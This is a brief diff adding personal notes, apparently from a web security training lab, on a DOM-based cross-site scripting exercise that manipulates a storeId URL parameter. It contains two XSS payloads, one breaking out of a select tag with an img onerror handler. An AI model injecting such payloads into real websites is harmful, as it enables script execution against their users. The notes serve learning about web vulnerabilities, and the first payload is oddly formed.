@@ -1,0 +1,9 @@
+used:
+product?productId=1&storeId="location.search.get(document.write(<script>alert(1)</script>))
+
+which was correct however the website recommends using:
+product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+
+as this uses the select tag
+
+the important part was being able to manipulate the URL to contain &storedid=
